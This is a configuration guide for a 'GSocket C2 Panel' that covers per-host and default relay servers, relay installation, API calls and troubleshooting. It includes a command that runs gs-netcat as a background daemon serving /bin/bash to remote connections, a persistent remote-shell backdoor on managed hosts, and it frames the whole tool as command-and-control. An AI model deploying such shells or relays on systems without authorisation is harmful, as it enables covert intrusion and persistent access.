# Custom GSRN Server Configuration Guide

This guide explains how to use custom Global Socket Relay Network (GSRN) servers with the GSocket C2 Panel.

## Overview

By default, gsocket uses the public GSRN infrastructure. However, you can configure the panel to use:
- A global default GSRN server for all hosts
- Per-host custom GSRN servers
- Your own private GSRN relay server

## Use Cases

### Why Use Custom GSRN Servers?

1. **Privacy**: Run your own relay server for complete control
2. **Performance**: Deploy relay servers closer to your hosts
3. **Isolation**: Separate different environments (dev/staging/prod)
4. **Compliance**: Keep data within specific geographic regions
5. **Reliability**: Reduce dependency on public infrastructure

## Configuration Methods

### Method 1: Global Default GSRN Server

Set a default GSRN server for all hosts in `.env`:

```bash
DEFAULT_GSRN_SERVER="relay.example.com:443"
ENABLE_CUSTOM_GSRN=true
```

All hosts without a specific custom GSRN server will use this default.

### Method 2: Per-Host Custom GSRN

Configure custom GSRN server when adding/editing a host via:

**Web Interface:**
1. Navigate to "Hosts Management"
2. Click "Add Host"
3. Fill in host details
4. Enter custom GSRN server: `relay.example.com:443`
5. Leave empty to use default GSRN

**API:**
```bash
curl -X POST http://localhost:3000/api/hosts \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "hostname": "web-server-01",
    "gsocket_secret": "your-secret",
    "custom_gsrn_server": "relay.example.com:443"
  }'
```

### Method 3: Environment Variables on Host

On the remote host running `gs-netcat -l`, you can also specify the relay:

```bash
export GSOCKET_ARGS="-s relay.example.com:443"
gs-netcat -l -k /path/to/secret -e /bin/bash -D
```

## Setting Up Your Own GSRN Relay Server

### Prerequisites
- Public server with static IP
- Open ports (typically 443 for TLS)
- gsocket installed

### Installation Steps

1. **Install gsocket on relay server:**
```bash
git clone https://github.com/hackerschoice/gsocket.git
cd gsocket
./configure
make
sudo make install
```

2. **Start GSRN relay:**
```bash
# Start relay on port 443 (requires root)
sudo gs-netcat -l -p 443

# Or use systemd service
sudo systemctl enable gsocket-relay
sudo systemctl start gsocket-relay
```

3. **Configure firewall:**
```bash
# Allow incoming connections on relay port
sudo ufw allow 443/tcp
```

4. **Update panel configuration:**
```bash
# In .env
DEFAULT_GSRN_SERVER="your-relay-server.com:443"
```

## GSRN Server Format

Custom GSRN servers should be specified as:
```
hostname:port
```

Examples:
- `relay.example.com:443`
- `10.0.1.50:7350`
- `gsrn-eu.mycompany.net:8080`

## Testing Custom GSRN Connection

### Via Web Interface
1. Go to "Hosts Management"
2. Find your host
3. Click "Test Connection"
4. Check the connection status

### Via API
```bash
curl -X POST http://localhost:3000/api/hosts/1/test-connection \
  -H "Authorization: Bearer <token>"
```

### Manual Test
```bash
# On panel server
export GSOCKET_ARGS="-s relay.example.com:443"
gs-netcat -k /tmp/secret -t

# Should output:
# Connection successful
```

## Troubleshooting

### Connection Fails to Custom GSRN

1. **Verify relay server is running:**
```bash
telnet relay.example.com 443
```

2. **Check firewall rules:**
```bash
sudo iptables -L -n | grep 443
```

3. **Test with gs-netcat directly:**
```bash
export GSOCKET_ARGS="-s relay.example.com:443"
gs-netcat -s your-secret -t
```

4. **Check panel logs:**
```bash
docker-compose logs web | grep GSRN
```

### Host Uses Wrong GSRN Server

**Priority order:**
1. Host's `custom_gsrn_server` field (highest priority)
2. Panel's `DEFAULT_GSRN_SERVER` setting
3. Default public GSRN (if nothing configured)

Check host configuration:
```bash
curl http://localhost:3000/api/hosts/1 \
  -H "Authorization: Bearer <token>"
```

### Migration for Existing Installations

If upgrading from an older version, run the migration:

```bash
python scripts/migrate_add_custom_gsrn.py
```

This adds the `custom_gsrn_server` field to existing hosts (defaults to NULL).

## Security Considerations

### TLS/SSL
- Always use TLS for production GSRN servers
- Port 443 is recommended for TLS connections
- gsocket handles encryption automatically

### Access Control
- Limit GSRN relay access via firewall rules
- Consider IP whitelisting for your relay server
- Monitor relay server logs for suspicious activity

### Secret Management
- Use unique secrets per host
- Rotate secrets periodically
- Never expose secrets in command line arguments (use `-k` flag)

## Best Practices

1. **Geographic Distribution**: Deploy relay servers close to your hosts
2. **Redundancy**: Configure backup GSRN servers
3. **Monitoring**: Monitor relay server health and performance
4. **Documentation**: Document your GSRN topology
5. **Testing**: Always test new GSRN configurations before production

## Example Configurations

### Development Environment
```bash
# .env
DEFAULT_GSRN_SERVER="dev-relay.internal:7350"
```

### Multi-Region Setup
```
# US hosts
Host: web-us-01
Custom GSRN: relay-us.example.com:443

# EU hosts
Host: web-eu-01
Custom GSRN: relay-eu.example.com:443

# Asia hosts
Host: web-asia-01
Custom GSRN: relay-asia.example.com:443
```

### Hybrid Setup (Public + Private)
```
# Sensitive hosts use private relay
Host: db-prod-01
Custom GSRN: relay-internal.corp:443

# Development hosts use public GSRN
Host: dev-test-01
Custom GSRN: (empty - uses public GSRN)
```

## API Reference

### Get Host with GSRN Info
```http
GET /api/hosts/{host_id}
```

Response:
```json
{
  "id": 1,
  "hostname": "web-01",
  "custom_gsrn_server": "relay.example.com:443",
  ...
}
```

### Update Host GSRN
```http
PUT /api/hosts/{host_id}
Content-Type: application/json

{
  "custom_gsrn_server": "new-relay.example.com:443"
}
```

### Remove Custom GSRN (use default)
```http
PUT /api/hosts/{host_id}
Content-Type: application/json

{
  "custom_gsrn_server": null
}
```

## Additional Resources

- [gsocket Documentation](https://github.com/hackerschoice/gsocket)
- [GSRN Protocol Details](https://github.com/hackerschoice/gsocket/blob/master/DOCUMENTATION.md)
- [Host Setup Guide](./HOST_SETUP_GUIDE.md)

## Support

For issues or questions:
1. Check panel logs: `docker-compose logs`
2. Review gsocket documentation
3. Test with `gs-netcat` directly
4. Open an issue on GitHub
